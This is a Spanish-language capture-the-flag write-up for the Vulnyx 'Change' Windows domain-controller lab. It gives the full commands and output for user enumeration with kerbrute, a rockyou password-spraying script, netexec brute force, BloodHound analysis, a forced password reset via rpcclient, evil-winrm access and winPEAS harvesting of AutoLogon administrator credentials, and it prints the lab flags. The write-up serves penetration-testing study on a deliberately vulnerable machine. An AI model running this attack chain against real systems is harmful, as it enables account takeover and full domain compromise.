---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Change Vulnyx (Intermediate - Windows)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-06 04:16 EDT
Nmap scan report for 192.168.5.72
Host is up (0.041s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-06 18:16:59Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: megachange.nyx0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: megachange.nyx0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:AE:19:BF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: CHANGE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: CHANGE, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:ae:19:bf (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-08-06T18:17:54
|_  start_date: N/A
|_clock-skew: 9h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.71 seconds
```

Veremos varios puertos bastantes interesantes, pero entre ellos el servidor `SAMBA`, tambien vemos el nombre del `DC` llamado `megachange.nyx0` por lo que lo añadiremos al `hosts`.

```shell
nano /etc/hosts

#Dentro del archivo
<IP>               megachange.nyx0
```

Lo guardamos y vamos a intentar enumerar el servidor `SAMBA` a ver si se puede de forma anonima.

```shell
smbclient -L \\megachange.nyx0 -N
```

Pero no veremos recursos compartidos, por lo que no nos sirve de nada.

Despues de estar buscando un rato, probaremos a enumerar con `kerbrute` un listado de usuarios a nivel de servidor, a ver cual es valido.

## Kerbrute

```shell
kerbrute userenum --dc <IP> -d megachange.nyx <WORDLIST>
```

Info:

```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 08/06/25 - Ronnie Flathers @ropnop

2025/08/06 04:32:24 >  Using KDC(s):
2025/08/06 04:32:24 >   192.168.5.72:88

2025/08/06 04:32:41 >  [+] VALID USERNAME:       alfredo@megachange.nyx
2025/08/06 04:32:46 >  [+] VALID USERNAME:       administrator@megachange.nyx
2025/08/06 04:32:53 >  [+] VALID USERNAME:       change@megachange.nyx
2025/08/06 04:35:19 >  [+] VALID USERNAME:       Administrator@megachange.nyx
2025/08/06 04:36:05 >  [+] VALID USERNAME:       Alfredo@megachange.nyx
2025/08/06 04:36:08 >  [+] VALID USERNAME:       sysadmin@megachange.nyx
2025/08/06 04:39:07 >  [+] VALID USERNAME:       Change@megachange.nyx
2025/08/06 04:52:52 >  Done! Tested 624370 usernames (7 valid) in 1227.682 seconds
```

Veremos que hemos encontrado varios usuarios interesantes, por lo que vamos a crear un listado de usuarios con esta informacion para enumerar dichos usuarios a ver si fueran vulnerables a `kerberoasting` de esta forma:

> users.txt

```
alfredo
administrator
change
sysadmin
```

```shell
impacket-GetNPUsers megachange.nyx/ -no-pass -usersfile users.txt -dc-ip <IP>
```

Pero con esto no sacaremos nada, por lo que ninguno es vulnerable a ello, por lo que vamos a probar la fuerza bruta normal con `netexec` de esta forma.

## Escalate user alfredo

### Netexec

Pero antes vamos a pasar el `rockyou.txt` a `UTF-8` y posteriormente vamos a combinarlo para que pille un formato apto para `netexec` y que lo hagamos desde un diccionario directamente:

```shell
iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt -o rockyou-utf8.txt
```

Ahora vamos a crear un script para combinar los usuarios con este diccionario.

> combo.sh

```bash
#!/bin/bash

# Define usuarios
usuarios=("alfredo" "change")

# Archivo de salida
output="combo.txt"

# Limpiar archivo anterior
> "$output"

# Loop por cada usuario y cada contraseña del diccionario
while IFS= read -r pass; do
  for user in "${usuarios[@]}"; do
    echo "$user:$pass" >> "$output"
  done
done < rockyou-utf8.txt

echo "[+] Combo generado en $output"
```

Lo ejecutaremos de esta forma:

```shell
bash combo.sh
```

Una vez terminado esto, tendremos un `combo.txt` pero no me funcionara el diccionario de una para dicha herramienta, por lo que probaremos simplemente el primero usuario que hemos encontrado.

```shell
netexec smb <IP> -u 'alfredo' -p rockyou-utf8.txt
```

Info:

```
...............................<RESTO_DE_CODIGO>...................................
SMB         192.168.5.72    445    CHANGE           [+] megachange.nyx\alfredo:Password1
```

Veremos que hemos encontrado un usuario valido, por lo que vamos a trastear con el a ver que encontramos.

```shell
enum4linux -a -u alfredo -p Password1 <IP>
```

Info:

```
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Aug  6 04:58:50 2025

 =========================================( Target Information )=========================================

Target ........... 192.168.5.72
RID Range ........ 500-550,1000-1050
Username ......... 'alfredo'
Password ......... 'Password1'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 192.168.5.72 )============================


[+] Got domain/workgroup name: MEGACHANGE


 ================================( Nbtstat Information for 192.168.5.72 )================================

Looking up status of 192.168.5.72
        CHANGE          <00> -         B <ACTIVE>  Workstation Service
        MEGACHANGE      <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        MEGACHANGE      <1c> - <GROUP> B <ACTIVE>  Domain Controllers
        MEGACHANGE      <1b> -         B <ACTIVE>  Domain Master Browser
        CHANGE          <20> -         B <ACTIVE>  File Server Service

        MAC Address = 08-00-27-AE-19-BF

 ===================================( Session Check on 192.168.5.72 )===================================

                                                                                                                                                             
[+] Server 192.168.5.72 allows sessions using username 'alfredo', password 'Password1'                                                                       
                                                                                                                                                             
                                                                                                                                                             
 ================================( Getting domain SID for 192.168.5.72 )================================
                                                                                                                                                             
Domain Name: MEGACHANGE                                                                                                                                      
Domain Sid: S-1-5-21-604841344-1972660676-6905362

[+] Host is part of a domain (not a workgroup)                                                                                                               
                                                                                                                                                             
                                                                                                                                                             
 ===================================( OS information on 192.168.5.72 )===================================
                                                                                                                                                             
                                                                                                                                                             
[E] Can't get OS info with smbclient                                                                                                                         
                                                                                                                                                             
                                                                                                                                                             
[+] Got OS info for 192.168.5.72 from srvinfo:                                                                                                               
        192.168.5.72   Wk Sv PDC Tim NT                                                                                                                      
        platform_id     :       500
        os version      :       10.0
        server type     :       0x80102b


 =======================================( Users on 192.168.5.72 )=======================================
                                                                                                                                                             
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain                 
index: 0xfaf RID: 0x44f acb: 0x00000210 Account: alfredo        Name: Alfredo   Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xfb0 RID: 0x450 acb: 0x00000210 Account: sysadmin       Name: Sysadmin  Desc: (null)

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[alfredo] rid:[0x44f]
user:[sysadmin] rid:[0x450]

 =================================( Share Enumeration on 192.168.5.72 )=================================
                                                                                                                                                             
do_connect: Connection to 192.168.5.72 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                      

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 192.168.5.72                                                                                                                 
                                                                                                                                                             
//192.168.5.72/ADMIN$   Mapping: DENIED Listing: N/A Writing: N/A                                                                                            
//192.168.5.72/C$       Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                                                               
                                                                                                                                                             
NT_STATUS_NO_SUCH_FILE listing \*                                                                                                                            
//192.168.5.72/IPC$     Mapping: N/A Listing: N/A Writing: N/A
//192.168.5.72/NETLOGON Mapping: OK Listing: OK Writing: N/A
//192.168.5.72/SYSVOL   Mapping: OK Listing: OK Writing: N/A

 ============================( Password Policy Information for 192.168.5.72 )============================
                                                                                                                                                             
                                                                                                                                                             

[+] Attaching to 192.168.5.72 using alfredo:Password1

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:192.168.5.72)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] MEGACHANGE
        [+] Builtin

[+] Password Info for Domain: MEGACHANGE

        [+] Minimum password length: 7
        [+] Password history length: 24
        [+] Maximum password age: 41 days 23 hours 53 minutes 
        [+] Password Complexity Flags: 000001

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 1

        [+] Minimum password age: 1 day 4 minutes 
        [+] Reset Account Lockout Counter: 10 minutes 
        [+] Locked Account Duration: 10 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:                                                                                                         
                                                                                                                                                             
                                                                                                                                                             
Password Complexity: Enabled                                                                                                                                 
Minimum Password Length: 7


 =======================================( Groups on 192.168.5.72 )=======================================
                                                                                                                                                             
                                                                                                                                                             
[+] Getting builtin groups:                                                                                                                                  
                                                                                                                                                             
group:[Server Operators] rid:[0x225]                                                                                                                         
group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]

[+]  Getting builtin group memberships:                                                                                                                      
                                                                                                                                                             
Group: Pre-Windows 2000 Compatible Access' (RID: 554) has member: NT AUTHORITY\Authenticated Users                                                           
Group: Windows Authorization Access Group' (RID: 560) has member: NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
Group: Users' (RID: 545) has member: NT AUTHORITY\INTERACTIVE
Group: Users' (RID: 545) has member: NT AUTHORITY\Authenticated Users
Group: Users' (RID: 545) has member: MEGACHANGE\Domain Users
Group: IIS_IUSRS' (RID: 568) has member: NT AUTHORITY\IUSR
Group: Guests' (RID: 546) has member: MEGACHANGE\Guest
Group: Guests' (RID: 546) has member: MEGACHANGE\Domain Guests
Group: Administrators' (RID: 544) has member: MEGACHANGE\Administrator
Group: Administrators' (RID: 544) has member: MEGACHANGE\Enterprise Admins
Group: Administrators' (RID: 544) has member: MEGACHANGE\Domain Admins
Group: Remote Management Users' (RID: 580) has member: MEGACHANGE\sysadmin

[+]  Getting local groups:                                                                                                                                   
                                                                                                                                                             
group:[Cert Publishers] rid:[0x205]                                                                                                                          
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]

[+]  Getting local group memberships:                                                                                                                        
                                                                                                                                                             
Group: Denied RODC Password Replication Group' (RID: 572) has member: MEGACHANGE\krbtgt                                                                      
Group: Denied RODC Password Replication Group' (RID: 572) has member: MEGACHANGE\Domain Controllers
Group: Denied RODC Password Replication Group' (RID: 572) has member: MEGACHANGE\Schema Admins
Group: Denied RODC Password Replication Group' (RID: 572) has member: MEGACHANGE\Enterprise Admins
Group: Denied RODC Password Replication Group' (RID: 572) has member: MEGACHANGE\Cert Publishers
Group: Denied RODC Password Replication Group' (RID: 572) has member: MEGACHANGE\Domain Admins
Group: Denied RODC Password Replication Group' (RID: 572) has member: MEGACHANGE\Group Policy Creator Owners
Group: Denied RODC Password Replication Group' (RID: 572) has member: MEGACHANGE\Read-only Domain Controllers

[+]  Getting domain groups:                                                                                                                                  
                                                                                                                                                             
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]                                                                                                  
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]

[+]  Getting domain group memberships:                                                                                                                       
                                                                                                                                                             
Group: 'Group Policy Creator Owners' (RID: 520) has member: MEGACHANGE\Administrator                                                                         
Group: 'Domain Users' (RID: 513) has member: MEGACHANGE\Administrator
Group: 'Domain Users' (RID: 513) has member: MEGACHANGE\krbtgt
Group: 'Domain Users' (RID: 513) has member: MEGACHANGE\alfredo
Group: 'Domain Users' (RID: 513) has member: MEGACHANGE\sysadmin
Group: 'Domain Controllers' (RID: 516) has member: MEGACHANGE\CHANGE$
Group: 'Domain Guests' (RID: 514) has member: MEGACHANGE\Guest
Group: 'Domain Admins' (RID: 512) has member: MEGACHANGE\Administrator
Group: 'Enterprise Admins' (RID: 519) has member: MEGACHANGE\Administrator
Group: 'Schema Admins' (RID: 518) has member: MEGACHANGE\Administrator

 ==================( Users on 192.168.5.72 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                             
                                                                                                                                                             
[I] Found new SID:                                                                                                                                           
S-1-5-21-604841344-1972660676-6905362                                                                                                                        

[I] Found new SID:                                                                                                                                           
S-1-5-21-604841344-1972660676-6905362                                                                                                                        

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[+] Enumerating users using SID S-1-5-80 and logon username 'alfredo', password 'Password1'                                                                  
                                                                                                                                                             
                                                                                                                                                             
[+] Enumerating users using SID S-1-5-21-3079407945-4085659519-1448383932 and logon username 'alfredo', password 'Password1'                                 
                                                                                                                                                             
S-1-5-21-3079407945-4085659519-1448383932-500 CHANGE\Administrator (Local User)                                                                              
S-1-5-21-3079407945-4085659519-1448383932-501 CHANGE\Guest (Local User)
S-1-5-21-3079407945-4085659519-1448383932-503 CHANGE\DefaultAccount (Local User)
S-1-5-21-3079407945-4085659519-1448383932-504 CHANGE\WDAGUtilityAccount (Local User)
S-1-5-21-3079407945-4085659519-1448383932-513 CHANGE\None (Domain Group)

[+] Enumerating users using SID S-1-5-32 and logon username 'alfredo', password 'Password1'                                                                  
                                                                                                                                                             
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                            
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-5-21-604841344-1972660676-6905362 and logon username 'alfredo', password 'Password1'                                     
                                                                                                                                                             
S-1-5-21-604841344-1972660676-6905362-500 MEGACHANGE\Administrator (Local User)                                                                              
S-1-5-21-604841344-1972660676-6905362-501 MEGACHANGE\Guest (Local User)
S-1-5-21-604841344-1972660676-6905362-502 MEGACHANGE\krbtgt (Local User)
S-1-5-21-604841344-1972660676-6905362-512 MEGACHANGE\Domain Admins (Domain Group)
S-1-5-21-604841344-1972660676-6905362-513 MEGACHANGE\Domain Users (Domain Group)
S-1-5-21-604841344-1972660676-6905362-514 MEGACHANGE\Domain Guests (Domain Group)
S-1-5-21-604841344-1972660676-6905362-515 MEGACHANGE\Domain Computers (Domain Group)
S-1-5-21-604841344-1972660676-6905362-516 MEGACHANGE\Domain Controllers (Domain Group)
S-1-5-21-604841344-1972660676-6905362-517 MEGACHANGE\Cert Publishers (Local Group)
S-1-5-21-604841344-1972660676-6905362-518 MEGACHANGE\Schema Admins (Domain Group)
S-1-5-21-604841344-1972660676-6905362-519 MEGACHANGE\Enterprise Admins (Domain Group)
S-1-5-21-604841344-1972660676-6905362-520 MEGACHANGE\Group Policy Creator Owners (Domain Group)
S-1-5-21-604841344-1972660676-6905362-521 MEGACHANGE\Read-only Domain Controllers (Domain Group)
S-1-5-21-604841344-1972660676-6905362-522 MEGACHANGE\Cloneable Domain Controllers (Domain Group)
S-1-5-21-604841344-1972660676-6905362-525 MEGACHANGE\Protected Users (Domain Group)
S-1-5-21-604841344-1972660676-6905362-526 MEGACHANGE\Key Admins (Domain Group)
S-1-5-21-604841344-1972660676-6905362-527 MEGACHANGE\Enterprise Key Admins (Domain Group)
S-1-5-21-604841344-1972660676-6905362-1000 MEGACHANGE\CHANGE$ (Local User)

[+] Enumerating users using SID S-1-5-90 and logon username 'alfredo', password 'Password1'                                                                  
                                                                                                                                                             
                                                                                                                                                             
[+] Enumerating users using SID S-1-5-80-3139157870-2983391045-3678747466-658725712 and logon username 'alfredo', password 'Password1'                       
                                                                                                                                                             
                                                                                                                                                             
 ===============================( Getting printer info for 192.168.5.72 )===============================
                                                                                                                                                             
No printers returned.                                                                                                                                        


enum4linux complete on Wed Aug  6 05:02:40 2025
```

Pero no veremos nada interesante, por lo que vamos a dumpearnos con `ldap` lo que podamos del dominio, para ver que informacion vemos interesante.

## Escalate user sysadmin

### LDAP

```shell
ldapdomaindump -u 'MEGACHANGE\alfredo' -p 'Password1' <IP>
```

Info:

```
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

Ahora abriremos el `HTML` llamado `domain_users.html`, entrando dentro de dicha pagina web, veremos lo siguiente bastante interesante:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-08-06 110709.png" alt=""><figcaption></figcaption></figure>

Vemos que el usuario `sysadmin` es miembro del grupo `Remote Management Users` lo cual es bastante interesante, ya que es el unico usuario en el que se puede conectar de forma remota al servidor.

Vamos a utilizar `BloodHound` para investigar que mas puede realizar el usuario `alfredo`.

```shell
bloodhound-python -u 'alfredo' -p 'Password1' -ns <IP> -d megachange.nyx -c All --zip
```

Info:

```
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: megachange.nyx
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (change.megachange.nyx:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: change.megachange.nyx
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: change.megachange.nyx
INFO: Found 6 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: CHANGE.megachange.nyx
INFO: Done in 00M 02S
INFO: Compressing output into 20250806051138_bloodhound.zip
```

Ahora con ese `ZIP` vamos a cargarlo en `BloodHound` y verlo todo de forma grafica.

```shell
bloodhound
```

Si investigamos lo que puede hacer el usuario `alfredo` frente al usuario `sysadmin` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-08-06 111702.png" alt=""><figcaption></figcaption></figure>

Vemos que puede forzar el cambio de contraseña de dicho usuario, por lo que podremos cambiar la contraseña al usuario `sysadmin` de esta forma:

```shell
rpcclient -U alfredo <IP>
```

Info:

```
Password for [WORKGROUP\alfredo]:
rpcclient $>
```

Una vez dentro forzaremos el cambio de contraseña de esta forma:

```shell
setuserinfo sysadmin 23 NewPassword123
```

Echo esto nos saldremos con `quit` y probaremos a entrar mediante `evil-winrm`.

### evil-winrm

```shell
evil-winrm -i <IP> -u sysadmin -p 'NewPassword123'
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sysadmin\Documents> whoami
megachange\sysadmin
```

Con esto veremos que ha funcionado, por lo que leeremos la `flag` del usuario.

> user.txt

```
01c920617c6470cdf46ba5861ce701c2
```

## Escalate Privileges

Vamos a pasarnos el `winPeasx64.exe` a la maquina victima desde el `kali` nos lo descargaremos en esta pagina:

URL =

Nos lo pasaremos de esta forma:

```shell
upload winPEASx64.exe
```

Info:

```
Info: Uploading /home/kali/Desktop/change/winPEASx64.exe to C:\Users\sysadmin\Documents\winPEASx64.exe
                                        
Data: 13541376 bytes of 13541376 bytes copied
                                        
Info: Upload successful!
```

Ahora vamos a ejecutarlo de esta forma:

```powershell
.\winPEASx64.exe
```

Info:

```
.................................<RESTO_DE_CODIGO>.................................
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  MEGACHANGE
    DefaultUserName               :  administrator
    DefaultPassword               :  d0m@in_c0ntr0ll3r
.................................<RESTO_DE_CODIGO>.................................
```

Veremos esto bastante interesante, lo que parece ser las credenciales del usuario `administrador` por lo que vamos a probarlas de esta forma:

```shell
evil-winrm -i <IP> -u Administrator -p 'd0m@in_c0ntr0ll3r'
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
megachange\administrator
```

Vemos que ha funcionado, por lo que leeremos la `flag` del usuario `root`.

> root.txt

```
79bf6f60850f10211c290be19ccf8b95
```
